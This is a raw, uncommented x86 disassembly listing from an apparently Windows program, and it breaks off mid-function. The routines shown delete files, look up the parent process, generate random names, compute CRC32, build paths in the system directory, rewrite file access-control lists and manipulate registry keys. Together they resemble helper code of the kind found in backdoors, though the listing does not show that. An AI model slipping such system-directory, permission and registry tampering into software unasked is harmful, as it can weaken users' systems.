push    ebp
mov     ebp, esp
mov     eax, [ebp+lpfilename]
push    eax
call    ds:getfileattributesa
and     eax, 1
test    eax, eax
jz      short loc_401023
push    80h
mov     ecx, [ebp+lpfilename]
push    ecx
call    ds:setfileattributesa
mov     edx, [ebp+lpfilename]
push    edx
call    ds:deletefilea
pop     ebp
retn
push    ebp
mov     ebp, esp
sub     esp, 130h
push    edi
mov     eax, [ebp+destination]
mov     byte ptr [eax], 0
mov     [ebp+hsnapshot], 0
mov     [ebp+var_130], 0
mov     [ebp+pe.dwsize], 0
mov     ecx, 49h
xor     eax, eax
lea     edi, [ebp+pe.cntusage]
rep stosd
mov     [ebp+pe.dwsize], 128h
push    0
push    2
call    createtoolhelp32snapshot
mov     [ebp+hsnapshot], eax
cmp     [ebp+hsnapshot], 0ffffffffh
jnz     short loc_40108d
xor     eax, eax
jmp     loc_401139
lea     ecx, [ebp+pe]
push    ecx
mov     edx, [ebp+hsnapshot]
push    edx
call    process32first
test    eax, eax
jz      short loc_4010d1
call    ds:getcurrentprocessid
cmp     [ebp+pe.th32processid], eax
jnz     short loc_4010bd
mov     eax, [ebp+pe.th32parentprocessid]
mov     [ebp+var_130], eax
jmp     short loc_4010d1
lea     ecx, [ebp+pe]
push    ecx
mov     edx, [ebp+hsnapshot]
push    edx
call    process32next
test    eax, eax
jnz     short loc_4010a1
lea     eax, [ebp+pe]
push    eax
mov     ecx, [ebp+hsnapshot]
push    ecx
call    process32first
test    eax, eax
jz      short loc_40111c
mov     edx, [ebp+pe.th32processid]
cmp     edx, [ebp+var_130]
jnz     short loc_401108
lea     eax, [ebp+pe.szexefile]
push    eax
mov     ecx, [ebp+destination]
push    ecx
call    strcpy
add     esp, 8
jmp     short loc_40111c
lea     edx, [ebp+pe]
push    edx
mov     eax, [ebp+hsnapshot]
push    eax
call    process32next
test    eax, eax
jnz     short loc_4010e5
mov     ecx, [ebp+hsnapshot]
push    ecx
call    ds:closehandle
mov     edx, [ebp+destination]
movsx   eax, byte ptr [edx]
test    eax, eax
jz      short loc_401137
mov     eax, 1
jmp     short loc_401139
xor     eax, eax
pop     edi
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
sub     esp, 8
call    ds:gettickcount
push    eax
call    srand
add     esp, 4
mov     [ebp+var_4], 0
jmp     short loc_401167
mov     eax, [ebp+var_4]
add     eax, 1
mov     [ebp+var_4], eax
mov     ecx, [ebp+var_4]
cmp     ecx, [ebp+arg_4]
jge     short loc_40119b
call    rand
mov     [ebp+var_8], eax
fild    [ebp+var_8]
fdiv    ds:dbl_4041e8
fmul    ds:dbl_4041e0
call    _ftol
movsx   edx, al
add     edx, 61h
mov     eax, [ebp+arg_0]
add     eax, [ebp+var_4]
mov     [eax], dl
jmp     short loc_40115e
mov     eax, [ebp+arg_0]
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
sub     esp, 0ch
mov     [ebp+var_8], 0
jmp     short loc_4011c8
mov     eax, [ebp+var_8]
add     eax, 1
mov     [ebp+var_8], eax
cmp     [ebp+var_8], 100h
jge     short loc_401222
mov     ecx, [ebp+var_8]
mov     [ebp+var_4], ecx
mov     [ebp+var_c], 0
jmp     short loc_4011e9
mov     edx, [ebp+var_c]
add     edx, 1
mov     [ebp+var_c], edx
cmp     [ebp+var_c], 8
jge     short loc_401213
mov     eax, [ebp+var_4]
and     eax, 1
test    eax, eax
jz      short loc_401209
mov     ecx, [ebp+var_4]
shr     ecx, 1
xor     ecx, 0edb88320h
mov     [ebp+var_4], ecx
jmp     short loc_401211
mov     edx, [ebp+var_4]
shr     edx, 1
mov     [ebp+var_4], edx
jmp     short loc_4011e0
mov     eax, [ebp+var_8]
mov     ecx, [ebp+var_4]
mov     dword_42cd40[eax*4], ecx
jmp     short loc_4011bf
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
sub     esp, 18h
push    ebx
call    sub_4011b0
mov     [ebp+var_4], 0ffffffffh
mov     eax, [ebp+arg_0]
mov     [ebp+var_c], eax
mov     [ebp+var_8], 0
jmp     short loc_40125b
mov     ecx, [ebp+var_8]
add     ecx, 1
mov     [ebp+var_8], ecx
mov     edx, [ebp+var_8]
cmp     edx, [ebp+arg_4]
jnb     short loc_401290
mov     eax, [ebp+var_4]
shr     eax, 8
mov     ecx, [ebp+var_4]
and     ecx, 0ffh
mov     edx, [ebp+var_c]
xor     ebx, ebx
mov     bl, [edx]
xor     ecx, ebx
xor     eax, dword_42cd40[ecx*4]
mov     [ebp+var_4], eax
mov     eax, [ebp+var_c]
add     eax, 1
mov     [ebp+var_c], eax
jmp     short loc_401252
cmp     [ebp+destination], 0
jz      short loc_401307
mov     [ebp+buffer], 0
xor     ecx, ecx
mov     [ebp+var_17], ecx
mov     [ebp+var_13], ecx
mov     [ebp+var_f], cl
push    10h
lea     edx, [ebp+buffer]
push    edx
mov     eax, [ebp+var_4]
xor     eax, 0ffffffffh
push    eax
call    _itoa
add     esp, 0ch
mov     [ebp+var_8], 0
jmp     short loc_4012cc
mov     ecx, [ebp+var_8]
add     ecx, 1
mov     [ebp+var_8], ecx
lea     edx, [ebp+buffer]
push    edx
call    strlen
add     esp, 4
cmp     [ebp+var_8], eax
jnb     short loc_4012f7
mov     eax, [ebp+var_8]
movsx   ecx, [ebp+eax+buffer]
push    ecx
call    toupper
add     esp, 4
mov     edx, [ebp+var_8]
mov     [ebp+edx+buffer], al
jmp     short loc_4012c3
lea     eax, [ebp+buffer]
push    eax
mov     ecx, [ebp+destination]
push    ecx
call    strcpy
add     esp, 8
mov     eax, [ebp+var_4]
xor     eax, 0ffffffffh
pop     ebx
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
sub     esp, 1ch
push    ebx
call    sub_4011b0
mov     [ebp+var_10], 0ffffffffh
mov     eax, [ebp+str]
mov     [ebp+var_1c], eax
mov     ecx, [ebp+str]
push    ecx
call    strlen
add     esp, 4
mov     [ebp+var_18], eax
mov     [ebp+var_14], 0
jmp     short loc_40135a
mov     edx, [ebp+var_14]
add     edx, 1
mov     [ebp+var_14], edx
mov     eax, [ebp+var_14]
cmp     eax, [ebp+var_18]
jge     short loc_40138f
mov     ecx, [ebp+var_10]
shr     ecx, 8
mov     edx, [ebp+var_10]
and     edx, 0ffh
mov     eax, [ebp+var_1c]
xor     ebx, ebx
mov     bl, [eax]
xor     edx, ebx
xor     ecx, dword_42cd40[edx*4]
mov     [ebp+var_10], ecx
mov     ecx, [ebp+var_1c]
add     ecx, 1
mov     [ebp+var_1c], ecx
jmp     short loc_401351
mov     [ebp+buffer], 0
xor     edx, edx
mov     [ebp+var_b], edx
mov     [ebp+var_7], edx
mov     [ebp+var_3], dl
push    10h
lea     eax, [ebp+buffer]
push    eax
mov     ecx, [ebp+var_10]
xor     ecx, 0ffffffffh
push    ecx
call    _itoa
add     esp, 0ch
mov     [ebp+var_14], 0
jmp     short loc_4013c5
mov     edx, [ebp+var_14]
add     edx, 1
mov     [ebp+var_14], edx
lea     eax, [ebp+buffer]
push    eax
call    strlen
add     esp, 4
cmp     [ebp+var_14], eax
jnb     short loc_4013f0
mov     ecx, [ebp+var_14]
movsx   edx, [ebp+ecx+buffer]
push    edx
call    tolower
add     esp, 4
mov     ecx, [ebp+var_14]
mov     [ebp+ecx+buffer], al
jmp     short loc_4013bc
lea     edx, [ebp+buffer]
push    edx
mov     eax, [ebp+str]
push    eax
call    strcpy
add     esp, 8
pop     ebx
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
sub     esp, 104h
push    edi
mov     [ebp+string1], 0
mov     ecx, 40h
xor     eax, eax
lea     edi, [ebp+var_103]
rep stosd
stosw
stosb
mov     eax, [ebp+lpstring2]
push    eax
lea     ecx, [ebp+string1]
push    ecx
call    ds:lstrcpya
lea     edx, [ebp+string1]
push    edx
call    sub_401320
add     esp, 4
push    104h
mov     eax, [ebp+lpstring2]
push    eax
call    ds:getsystemdirectorya
push    offset string2
mov     ecx, [ebp+lpstring2]
push    ecx
call    ds:lstrcata
lea     edx, [ebp+string1]
push    edx
mov     eax, [ebp+lpstring2]
push    eax
call    ds:lstrcata
mov     ecx, [ebp+arg_4]
push    ecx
mov     edx, [ebp+lpstring2]
push    edx
call    ds:lstrcata
pop     edi
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
mov     eax, [ebp+lpfilename]
push    eax
call    ds:getfileattributesa
xor     ecx, ecx
cmp     eax, 0ffffffffh
setnz   cl
mov     al, cl
pop     ebp
retn
push    ebp
mov     ebp, esp
push    0ffffffffh
push    offset stru_4041f0
push    offset _except_handler3
mov     eax, large fs:0
push    eax
mov     large fs:0, esp
add     esp, 0ffffff78h
push    ebx
push    esi
push    edi
mov     [ebp+referenceddomainname], 0
mov     [ebp+cchreferenceddomainname], 0
mov     [ebp+sid], 0
mov     [ebp+cbsid], 0
mov     [ebp+psecuritydescriptor], 0
mov     [ebp+nlengthneeded], 0
mov     [ebp+pdacl], 0
mov     [ebp+pacl], 0
mov     [ebp+dwbytes], 0
mov     [ebp+pace], 0
mov     [ebp+dwaceindex], 0
mov     [ebp+var_70], 0
mov     [ebp+requestedinformation], 4
mov     [ebp+var_4c], 0
mov     [ebp+var_40], 0
mov     [ebp+ms_exc.registration.trylevel], 0
lea     eax, [ebp+peuse]
push    eax
lea     ecx, [ebp+cchreferenceddomainname]
push    ecx
mov     edx, [ebp+referenceddomainname]
push    edx
lea     eax, [ebp+cbsid]
push    eax
mov     ecx, [ebp+sid]
push    ecx
mov     edx, [ebp+lpaccountname]
push    edx
push    0
call    ds:lookupaccountnamea
mov     [ebp+var_6c], eax
cmp     [ebp+var_6c], 0
jz      short loc_401587
jmp     loc_4019e2
call    ds:getlasterror
cmp     eax, 7ah
jz      short loc_401597
jmp     loc_4019e2
mov     eax, [ebp+cbsid]
push    eax
push    8
call    ds:getprocessheap
push    eax
call    ds:heapalloc
mov     [ebp+sid], eax
cmp     [ebp+sid], 0
jnz     short loc_4015b8
jmp     loc_4019e2
mov     ecx, [ebp+cchreferenceddomainname]
push    ecx
push    8
call    ds:getprocessheap
push    eax
call    ds:heapalloc
mov     [ebp+referenceddomainname], eax
cmp     [ebp+referenceddomainname], 0
jnz     short loc_4015d9
jmp     loc_4019e2
lea     edx, [ebp+peuse]
push    edx
lea     eax, [ebp+cchreferenceddomainname]
push    eax
mov     ecx, [ebp+referenceddomainname]
push    ecx
lea     edx, [ebp+cbsid]
push    edx
mov     eax, [ebp+sid]
push    eax
mov     ecx, [ebp+lpaccountname]
push    ecx
push    0
call    ds:lookupaccountnamea
mov     [ebp+var_6c], eax
cmp     [ebp+var_6c], 0
jnz     short loc_40160a
jmp     loc_4019e2
lea     edx, [ebp+nlengthneeded]
push    edx
push    0
mov     eax, [ebp+psecuritydescriptor]
push    eax
mov     ecx, [ebp+requestedinformation]
push    ecx
mov     edx, [ebp+lpfilename]
push    edx
call    ds:getfilesecuritya
mov     [ebp+var_6c], eax
cmp     [ebp+var_6c], 0
jz      short loc_401630
jmp     loc_4019e2
call    ds:getlasterror
cmp     eax, 7ah
jz      short loc_401640
jmp     loc_4019e2
mov     eax, [ebp+nlengthneeded]
push    eax
push    8
call    ds:getprocessheap
push    eax
call    ds:heapalloc
mov     [ebp+psecuritydescriptor], eax
cmp     [ebp+psecuritydescriptor], 0
jnz     short loc_401661
jmp     loc_4019e2
lea     ecx, [ebp+nlengthneeded]
push    ecx
mov     edx, [ebp+nlengthneeded]
push    edx
mov     eax, [ebp+psecuritydescriptor]
push    eax
mov     ecx, [ebp+requestedinformation]
push    ecx
mov     edx, [ebp+lpfilename]
push    edx
call    ds:getfilesecuritya
mov     [ebp+var_6c], eax
cmp     [ebp+var_6c], 0
jnz     short loc_401689
jmp     loc_4019e2
push    1
lea     eax, [ebp+var_84]
push    eax
call    ds:initializesecuritydescriptor
test    eax, eax
jnz     short loc_4016a1
jmp     loc_4019e2
lea     ecx, [ebp+bdacldefaulted]
push    ecx
lea     edx, [ebp+pdacl]
push    edx
lea     eax, [ebp+bdaclpresent]
push    eax
mov     ecx, [ebp+psecuritydescriptor]
push    ecx
call    ds:getsecuritydescriptordacl
test    eax, eax
jnz     short loc_4016c0
jmp     loc_4019e2
mov     [ebp+paclinformation], 0
mov     [ebp+var_50], 0
mov     [ebp+var_54], 8
cmp     [ebp+pdacl], 0
jnz     short loc_4016e2
mov     [ebp+bdaclpresent], 0
cmp     [ebp+bdaclpresent], 0
jz      short loc_401703
push    2
push    0ch
lea     edx, [ebp+paclinformation]
push    edx
mov     eax, [ebp+pdacl]
push    eax
call    ds:getaclinformation
test    eax, eax
jnz     short loc_401703
jmp     loc_4019e2
mov     ecx, [ebp+sid]
push    ecx
call    ds:getlengthsid
mov     edx, [ebp+var_54]
lea     eax, [edx+eax+8]
mov     [ebp+dwbytes], eax
mov     ecx, [ebp+dwbytes]
push    ecx
push    8
call    ds:getprocessheap
push    eax
call    ds:heapalloc
mov     [ebp+pacl], eax
push    2
mov     edx, [ebp+dwbytes]
push    edx
mov     eax, [ebp+pacl]
push    eax
call    ds:initializeacl
test    eax, eax
jnz     short loc_401746
jmp     loc_4019e2
mov     [ebp+var_70], 0
cmp     [ebp+bdaclpresent], 0
jz      loc_4017f1
cmp     [ebp+paclinformation], 0
jz      loc_4017f1
mov     [ebp+dwaceindex], 0
jmp     short loc_401773
mov     ecx, [ebp+dwaceindex]
add     ecx, 1
mov     [ebp+dwaceindex], ecx
mov     edx, [ebp+dwaceindex]
cmp     edx, [ebp+paclinformation]
jnb     short loc_4017f1
lea     eax, [ebp+pace]
push    eax
mov     ecx, [ebp+dwaceindex]
push    ecx
mov     edx, [ebp+pdacl]
push    edx
call    ds:getace
test    eax, eax
jnz     short loc_401796
jmp     loc_4019e2
mov     eax, [ebp+pace]
xor     ecx, ecx
mov     cl, [eax+1]
and     ecx, 10h
test    ecx, ecx
jz      short loc_4017a7
jmp     short loc_4017f1
mov     edx, [ebp+pace]
add     edx, 8
push    edx
mov     eax, [ebp+sid]
push    eax
call    ds:equalsid
test    eax, eax
jz      short loc_4017be
jmp     short loc_40176a
mov     ecx, [ebp+pace]
xor     edx, edx
mov     dx, [ecx+2]
push    edx
mov     eax, [ebp+pace]
push    eax
push    0ffffffffh
push    2
mov     ecx, [ebp+pacl]
push    ecx
call    ds:addace
test    eax, eax
jnz     short loc_4017e3
jmp     loc_4019e2
mov     edx, [ebp+var_70]
add     edx, 1
mov     [ebp+var_70], edx
jmp     loc_40176a
push    offset procname
push    offset modulename
call    ds:getmodulehandlea
push    eax
call    ds:getprocaddress
mov     [ebp+var_40], eax
cmp     [ebp+var_40], 0
jz      short loc_40182f
mov     eax, [ebp+sid]
push    eax
mov     ecx, [ebp+accessmask]
push    ecx
push    3
push    2
mov     edx, [ebp+pacl]
push    edx
call    [ebp+var_40]
test    eax, eax
jnz     short loc_40182d
jmp     loc_4019e2
jmp     short loc_40184c
mov     eax, [ebp+sid]
push    eax
mov     ecx, [ebp+accessmask]
push    ecx
push    2
mov     edx, [ebp+pacl]
push    edx
call    ds:addaccessallowedace
test    eax, eax
jnz     short loc_40184c
jmp     loc_4019e2
cmp     [ebp+bdaclpresent], 0
jz      short loc_4018ad
cmp     [ebp+paclinformation], 0
jz      short loc_4018ad
jmp     short loc_401863
mov     eax, [ebp+dwaceindex]
add     eax, 1
mov     [ebp+dwaceindex], eax
mov     ecx, [ebp+dwaceindex]
cmp     ecx, [ebp+paclinformation]
jnb     short loc_4018ad
lea     edx, [ebp+pace]
push    edx
mov     eax, [ebp+dwaceindex]
push    eax
mov     ecx, [ebp+pdacl]
push    ecx
call    ds:getace
test    eax, eax
jnz     short loc_401886
jmp     loc_4019e2
mov     edx, [ebp+pace]
xor     eax, eax
mov     ax, [edx+2]
push    eax
mov     ecx, [ebp+pace]
push    ecx
push    0ffffffffh
push    2
mov     edx, [ebp+pacl]
push    edx
call    ds:addace
test    eax, eax
jnz     short loc_4018ab
jmp     loc_4019e2
jmp     short loc_40185a
push    0
mov     eax, [ebp+pacl]
push    eax
push    1
lea     ecx, [ebp+var_84]
push    ecx
call    ds:setsecuritydescriptordacl
test    eax, eax
jnz     short loc_4018cb
jmp     loc_4019e2
push    offset asetsecuritydes
push    offset aadvapi32dll_1
call    ds:getmodulehandlea
push    eax
call    ds:getprocaddress
mov     [ebp+var_4c], eax
cmp     [ebp+var_4c], 0
jz      loc_4019c0
mov     word ptr [ebp+var_8c], 0
mov     [ebp+var_98], 0
mov     [ebp+pcontrol], 0
mov     [ebp+dwrevision], 0
lea     edx, [ebp+dwrevision]
push    edx
lea     eax, [ebp+pcontrol]
push    eax
mov     ecx, [ebp+psecuritydescriptor]
push    ecx
call    ds:getsecuritydescriptorcontrol
test    eax, eax
jnz     short loc_401935
jmp     loc_4019e2
mov     edx, dword ptr [ebp+pcontrol]
and     edx, 0ffffh
and     edx, 400h
test    edx, edx
jz      short loc_401964
mov     word ptr [ebp+var_8c], 500h
mov     ax, word ptr [ebp+var_8c]
mov     [ebp+var_98], ax
jmp     short loc_401991
mov     ecx, dword ptr [ebp+pcontrol]
and     ecx, 0ffffh
and     ecx, 1000h
test    ecx, ecx
jz      short loc_401991
mov     word ptr [ebp+var_8c], 1000h
mov     dx, word ptr [ebp+var_8c]
mov     [ebp+var_98], dx
mov     eax, [ebp+var_8c]
and     eax, 0ffffh
test    eax, eax
jz      short loc_4019c0
mov     cx, [ebp+var_98]
push    ecx
mov     dx, word ptr [ebp+var_8c]
push    edx
lea     eax, [ebp+var_84]
push    eax
call    [ebp+var_4c]
test    eax, eax
jnz     short loc_4019c0
jmp     short loc_4019e2
lea     ecx, [ebp+var_84]
push    ecx
mov     edx, [ebp+requestedinformation]
push    edx
mov     eax, [ebp+lpfilename]
push    eax
call    ds:setfilesecuritya
test    eax, eax
jnz     short loc_4019db
jmp     short loc_4019e2
mov     [ebp+var_34], 1
mov     [ebp+ms_exc.registration.trylevel], 0ffffffffh
call    loc_4019f0
jmp     short loc_401a55
cmp     [ebp+sid], 0
jz      short loc_401a09
mov     ecx, [ebp+sid]
push    ecx
push    0
call    ds:getprocessheap
push    eax
call    ds:heapfree
cmp     [ebp+referenceddomainname], 0
jz      short loc_401a22
mov     edx, [ebp+referenceddomainname]
push    edx
push    0
call    ds:getprocessheap
push    eax
call    ds:heapfree
cmp     [ebp+psecuritydescriptor], 0
jz      short loc_401a3b
mov     eax, [ebp+psecuritydescriptor]
push    eax
push    0
call    ds:getprocessheap
push    eax
call    ds:heapfree
cmp     [ebp+pacl], 0
jz      short loc_401a54
mov     ecx, [ebp+pacl]
push    ecx
push    0
call    ds:getprocessheap
push    eax
call    ds:heapfree
retn
mov     eax, [ebp+var_34]
mov     ecx, [ebp+ms_exc.registration.next]
mov     large fs:0, ecx
pop     edi
pop     esi
pop     ebx
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
push    ecx
mov     [ebp+var_4], 0
mov     eax, 1
test    eax, eax
jz      short loc_401aab
push    1
push    offset asc_42c9cc
mov     ecx, [ebp+arg_0]
add     ecx, [ebp+var_4]
push    ecx
call    _strnicmp
add     esp, 0ch
test    eax, eax
jz      short loc_401aa0
jmp     short loc_401aab
mov     edx, [ebp+var_4]
add     edx, 1
mov     [ebp+var_4], edx
jmp     short loc_401a7b
mov     eax, [ebp+arg_0]
add     eax, [ebp+var_4]
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
push    0ffffffffh
push    offset stru_404200
push    offset _except_handler3
mov     eax, large fs:0
push    eax
mov     large fs:0, esp
add     esp, 0fffffda0h
push    ebx
push    esi
push    edi
mov     [ebp+var_24], 0
mov     [ebp+var_154], 0
push    20h
push    0
lea     eax, [ebp+valuename]
push    eax
call    memset
add     esp, 0ch
push    104h
push    0
lea     ecx, [ebp+data]
push    ecx
call    memset
add     esp, 0ch
push    104h
push    0
lea     edx, [ebp+source]
push    edx
call    memset
add     esp, 0ch
mov     [ebp+ms_exc.registration.trylevel], 0
lea     eax, [ebp+phkresult]
push    eax
push    20019h
push    0
mov     ecx, [ebp+lpsubkey]
push    ecx
mov     edx, [ebp+hkey]
push    edx
call    ds:regopenkeyexa
test    eax, eax
jz      short loc_401b69
mov     [ebp+var_24], 0ffffffffh
jmp     def_401b85
mov     eax, [ebp+arg_1c]
mov     [ebp+var_260], eax
cmp     [ebp+var_260], 3
ja      def_401b85
mov     ecx, [ebp+var_260]
jmp     ds:jpt_401b85[ecx*4]
mov     edx, [ebp+type]
mov     [ebp+var_264], edx
mov     eax, [ebp+var_264]
sub     eax, 1
mov     [ebp+var_264], eax
cmp     [ebp+var_264], 6
ja      def_401bb7
mov     ecx, [ebp+var_264]
jmp     ds:jpt_401bb7[ecx*4]
mov     [ebp+cbdata], 104h
lea     edx, [ebp+cbdata]
push    edx
lea     eax, [ebp+data]
push    eax
lea     ecx, [ebp+type]
push    ecx
push    0
mov     edx, [ebp+lpvaluename]
push    edx
mov     eax, [ebp+phkresult]
push    eax
call    ds:regqueryvalueexa
test    eax, eax
jnz     short loc_401c0e
lea     ecx, [ebp+data]
push    ecx
call    sub_401a70
add     esp, 4
push    eax
mov     edx, [ebp+destination]
push    edx
call    strcpy
add     esp, 8
mov     [ebp+var_24], 1
jmp     def_401bb7
mov     [ebp+cbdata], 104h
lea     eax, [ebp+cbdata]
push    eax
lea     ecx, [ebp+data]
push    ecx
lea     edx, [ebp+type]
push    edx
push    0
mov     eax, [ebp+lpvaluename]
push    eax
mov     ecx, [ebp+phkresult]
push    ecx
call    ds:regqueryvalueexa
test    eax, eax
jnz     short loc_401cb6
lea     edx, [ebp+data]
mov     [ebp+str], edx
jmp     short loc_401c5f
push    0
mov     eax, [ebp+str]
push    eax
call    strchr
add     esp, 8
add     eax, 1
mov     [ebp+str], eax
mov     ecx, [ebp+str]
movsx   edx, byte ptr [ecx]
test    edx, edx
jz      short loc_401c9c
push    104h
mov     eax, [ebp+str]
push    eax
lea     ecx, [ebp+source]
push    ecx
call    strncat
add     esp, 0ch
push    104h
push    offset source
lea     edx, [ebp+source]
push    edx
call    strncat
add     esp, 0ch
jmp     short loc_401c4b
lea     eax, [ebp+source]
push    eax
mov     ecx, [ebp+destination]
push    ecx
call    strcpy
add     esp, 8
mov     [ebp+var_24], 1
jmp     short def_401bb7
mov     [ebp+cbdata], 4
lea     edx, [ebp+cbdata]
push    edx
lea     eax, [ebp+var_150]
push    eax
lea     ecx, [ebp+type]
push    ecx
push    0
mov     edx, [ebp+lpvaluename]
push    edx
mov     eax, [ebp+phkresult]
push    eax
call    ds:regqueryvalueexa
test    eax, eax
jnz     short loc_401d05
mov     ecx, dword ptr [ebp+var_150]
push    ecx
push    offset ad
mov     edx, [ebp+destination]
push    edx
call    ds:wsprintfa
add     esp, 0ch
mov     [ebp+var_24], 1
jmp     short def_401bb7
mov     eax, [ebp+arg_18]
mov     [ebp+cbdata], eax
lea     ecx, [ebp+cbdata]
push    ecx
mov     edx, [ebp+lpdata]
push    edx
lea     eax, [ebp+type]
push    eax
push    0
mov     ecx, [ebp+lpvaluename]
push    ecx
mov     edx, [ebp+phkresult]
push    edx
call    ds:regqueryvalueexa
test    eax, eax
jnz     short def_401bb7
mov     [ebp+var_24], 1
jmp     def_401b85
mov     eax, 1
test    eax, eax
jz      loc_401de9
push    104h
push    0
lea     ecx, [ebp+data]
push    ecx
call    memset
add     esp, 0ch
mov     [ebp+cbdata], 104h
push    0
push    0
push    0
push    0
lea     edx, [ebp+cbdata]
push    edx
lea     eax, [ebp+data]
push    eax
mov     ecx, [ebp+var_154]
mov     [ebp+dwindex], ecx
mov     edx, [ebp+dwindex]
push    edx
mov     eax, [ebp+phkresult]
push    eax
mov     ecx, [ebp+var_154]
add     ecx, 1
mov     [ebp+var_154], ecx
call    ds:regenumkeyexa
test    eax, eax
jz      short loc_401dae
jmp     short loc_401de9
lea     edx, [ebp+data]
push    edx
push    offset as
lea     eax, [ebp+source]
push    eax
call    ds:wsprintfa
add     esp, 0ch
lea     ecx, [ebp+source]
push    ecx
mov     edx, [ebp+destination]
push    edx
call    strcat
add     esp, 8
mov     [ebp+var_24], 1
jmp     loc_401d3c
jmp     def_401b85
mov     eax, 1
test    eax, eax
jz      loc_401fb7
push    20h
push    0
lea     ecx, [ebp+valuename]
push    ecx
call    memset
add     esp, 0ch
push    104h
push    0
lea     edx, [ebp+data]
push    edx
call    memset
add     esp, 0ch
push    104h
push    0
lea     eax, [ebp+source]
push    eax
call    memset
add     esp, 0ch
mov     [ebp+cchvaluename], 20h
mov     [ebp+cbdata], 104h
lea     ecx, [ebp+cbdata]
push    ecx
lea     edx, [ebp+data]
push    edx
lea     eax, [ebp+type]
push    eax
push    0
lea     ecx, [ebp+cchvaluename]
push    ecx
lea     edx, [ebp+valuename]
push    edx
mov     eax, [ebp+var_154]
mov     [ebp+var_26c], eax
mov     ecx, [ebp+var_26c]
push    ecx
mov     edx, [ebp+phkresult]
push    edx
mov     eax, [ebp+var_154]
add     eax, 1
mov     [ebp+var_154], eax
call    ds:regenumvaluea
test    eax, eax
jz      short loc_401e9c
jmp     loc_401fb7
mov     ecx, [ebp+type]
mov     [ebp+var_270], ecx
mov     edx, [ebp+var_270]
sub     edx, 1
mov     [ebp+var_270], edx
cmp     [ebp+var_270], 6
ja      def_401ec7
mov     eax, [ebp+var_270]
jmp     ds:jpt_401ec7[eax*4]
lea     ecx, [ebp+data]
push    ecx
push    offset aregsz
lea     edx, [ebp+valuename]
push    edx
push    offset a24s15ss
lea     eax, [ebp+source]
push    eax
call    ds:wsprintfa
add     esp, 14h
jmp     def_401ec7
lea     ecx, [ebp+data]
push    ecx
push    offset aregexpandsz
lea     edx, [ebp+valuename]
push    edx
push    offset a24s15ss_0
lea     eax, [ebp+source]
push    eax
call    ds:wsprintfa
add     esp, 14h
jmp     short def_401ec7
lea     ecx, [ebp+data]
push    ecx
lea     edx, [ebp+data]
push    edx
push    offset aregdword
lea     eax, [ebp+valuename]
push    eax
push    offset a24s15s0xxd
lea     ecx, [ebp+source]
push    ecx
call    ds:wsprintfa
add     esp, 18h
jmp     short def_401ec7
push    offset aregmultisz
lea     edx, [ebp+valuename]
push    edx
push    offset a24s15s
lea     eax, [ebp+source]
push    eax
call    ds:wsprintfa
add     esp, 10h
jmp     short def_401ec7
push    offset aregbinary
lea     ecx, [ebp+valuename]
push    ecx
push    offset a24s15s_0
lea     edx, [ebp+source]
push    edx
call    ds:wsprintfa
add     esp, 10h
lea     eax, [ebp+source]
push    eax
mov     ecx, [ebp+destination]
push    ecx
call    ds:lstrcata
mov     [ebp+var_24], 1
jmp     loc_401dee
jmp     short def_401b85
mov     [ebp+var_24], 1
mov     [ebp+ms_exc.registration.trylevel], 0ffffffffh
call    loc_401fce
jmp     short loc_401fe6
mov     edx, [ebp+hkey]
push    edx
call    ds:regclosekey
mov     eax, [ebp+phkresult]
push    eax
call    ds:regclosekey
retn
mov     eax, [ebp+var_24]
mov     ecx, [ebp+ms_exc.registration.next]
mov     large fs:0, ecx
pop     edi
pop     esi
pop     ebx
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
push    0ffffffffh
push    offset stru_404210
push    offset _except_handler3
mov     eax, large fs:0
push    eax
mov     large fs:0, esp
add     esp, 0ffffffe4h
push    ebx
push    esi
push    edi
mov     [ebp+var_1c], 0
mov     [ebp+ms_exc.registration.trylevel], 0
mov     eax, [ebp+arg_18]
mov     [ebp+var_28], eax
cmp     [ebp+var_28], 3
ja      def_402094
mov     ecx, [ebp+var_28]
jmp     ds:jpt_402094[ecx*4]
lea     edx, [ebp+dwdisposition]
push    edx
lea     eax, [ebp+phkresult]
push    eax
push    0
push    0f003fh
push    0
push    0
push    0
mov     ecx, [ebp+lpsubkey]
push    ecx
mov     edx, [ebp+hkey]
push    edx
call    ds:regcreatekeyexa
test    eax, eax
jz      short loc_4020c7
jmp     def_402094
lea     eax, [ebp+phkresult]
push    eax
push    2001fh
push    0
mov     ecx, [ebp+lpsubkey]
push    ecx
mov     edx, [ebp+hkey]
push    edx
call    ds:regopenkeyexa
test    eax, eax
jz      short loc_4020e9
jmp     def_402094
mov     eax, [ebp+dwtype]
mov     [ebp+var_2c], eax
cmp     [ebp+var_2c], 0
jbe     short loc_40215d
cmp     [ebp+var_2c], 2
jbe     short loc_402103
cmp     [ebp+var_2c], 4
jz      short loc_402138
jmp     short loc_40215d
mov     ecx, [ebp+str]
push    ecx
call    strlen
add     esp, 4
add     eax, 1
push    eax
mov     edx, [ebp+str]
push    edx
mov     eax, [ebp+dwtype]
push    eax
push    0
mov     ecx, [ebp+lpvaluename]
push    ecx
mov     edx, [ebp+phkresult]
push    edx
call    ds:regsetvalueexa
test    eax, eax
jnz     short loc_402136
mov     [ebp+var_1c], 1
jmp     short loc_40215d
push    4
lea     eax, [ebp+data]
push    eax
mov     ecx, [ebp+dwtype]
push    ecx
push    0
mov     edx, [ebp+lpvaluename]
push    edx
mov     eax, [ebp+phkresult]
push    eax
call    ds:regsetvalueexa
test    eax, eax
jnz     short loc_40215d
mov     [ebp+var_1c], 1
jmp     short def_402094
lea     ecx, [ebp+phkresult]
push    ecx
push    2001fh
push    0
mov     edx, [ebp+lpsubkey]
push    edx
mov     eax, [ebp+hkey]
push    eax
call    ds:regopenkeyexa
test    eax, eax
jz      short loc_40217e
jmp     short def_402094
mov     ecx, [ebp+lpvaluename]
push    ecx
mov     edx, [ebp+phkresult]
push    edx
call    ds:regdeletekeya
test    eax, eax
jnz     short loc_402197
mov     [ebp+var_1c], 1
jmp     short def_402094
lea     eax, [ebp+phkresult]
push    eax
push    2001fh
push    0
mov     ecx, [ebp+lpsubkey]
push    ecx
mov     edx, [ebp+hkey]
push    edx
